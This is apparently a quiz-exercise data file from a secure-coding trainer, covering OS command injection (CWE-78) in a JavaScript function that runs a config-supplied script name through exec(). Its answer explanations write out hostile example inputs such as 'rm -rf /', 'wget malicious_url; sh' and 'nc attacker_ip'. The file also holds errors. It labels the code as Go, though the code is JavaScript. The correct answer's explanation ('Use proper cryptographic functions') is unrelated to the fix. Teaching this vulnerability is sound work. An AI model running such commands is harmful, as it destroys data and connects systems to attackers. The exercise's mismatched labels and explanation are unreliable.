import type { Exercise } from '@/data/exercises'

export const cwe78SystemProperty: Exercise = {
  cweId: 'CWE-78',
  name: 'OS Command Injection - Script Execution via Properties',
  language: 'Go',

  vulnerableFunction: `function executeConfigScript() {
  const { exec } = require('child_process');

  // Get script name from environment/config
  const scriptName = process.env.SCRIPT_NAME || getConfigProperty('script.name');

  if (scriptName) {
    // Execute the configured script
    return new Promise((resolve, reject) => {
      exec(scriptName, (error, stdout, stderr) => {
        if (error) {
          reject(error);
        } else {
          resolve({ output: stdout, errors: stderr });
        }
      });
    });
  }

  return Promise.resolve({ output: '', errors: '' });
}`,

  vulnerableLine: `exec(scriptName, (error, stdout, stderr) => {`,

  options: [
    {
      code: `const allowedScripts = ['/opt/scripts/backup.sh', '/opt/scripts/cleanup.sh']; if (allowedScripts.includes(scriptName)) { exec(scriptName, callback); }`,
      correct: true,
      explanation: `Use proper cryptographic functions`
    },
    {
      code: `exec(scriptName, (error, stdout, stderr) => {`,
      correct: false,
      explanation: 'MITRE system property pattern: Environment/config property directly controls which program executes. Attacker can set SCRIPT_NAME="rm -rf /" or "wget malicious_url; sh" to execute arbitrary commands with application privileges.'
    },
    {
      code: `if (scriptName.endsWith('.sh')) { exec(scriptName, callback); }`,
      correct: false,
      explanation: 'File extension check insufficient. Attackers can use valid extensions with malicious paths like "/bin/bash -c malicious_command.sh" or shell metacharacters within the filename.'
    },
    {
      code: `const command = '/bin/bash ' + scriptName; exec(command, callback);`,
      correct: false,
      explanation: 'User input allows command injection'
    },
    {
      code: `if (!scriptName.includes(';') && !scriptName.includes('&')) { exec(scriptName, callback); }`,
      correct: false,
      explanation: 'Partial character filtering misses many injection vectors like pipes |, backticks, command substitution $(), and path traversal that can execute unintended commands.'
    },
    {
      code: `if (scriptName.startsWith('/opt/scripts/')) { exec(scriptName, callback); }`,
      correct: false,
      explanation: 'Path prefix check vulnerable to directory traversal. Attacker can use "../" sequences or symlinks to escape the intended directory while maintaining the required prefix.'
    },
    {
      code: `const sanitized = scriptName.replace(/[^a-zA-Z0-9/_.-]/g, ''); exec(sanitized, callback);`,
      correct: false,
      explanation: 'Character sanitization helps but still allows dangerous combinations. Paths like "/bin/cat /etc/passwd" use only allowed characters but execute unintended commands.'
    },
    {
      code: `if (scriptName && scriptName.length < 100) { exec(scriptName, callback); }`,
      correct: false,
      explanation: 'Length and existence checks do not prevent command injection. Short malicious commands like "rm *" or "nc attacker_ip" can be very effective within length limits.'
    },
    {
      code: `try { exec(scriptName, callback); } catch(e) { console.error('Script execution failed'); }`,
      correct: false,
      explanation: 'Exception handling does not prevent command injection. Malicious commands execute during the shell invocation before any exception handling can intervene.'
    },
    {
      code: `const command = ['/bin/sh', '-c', scriptName]; spawn(command[0], command.slice(1), callback);`,
      correct: false,
      explanation: 'User input allows command injection'
    }
  ]
}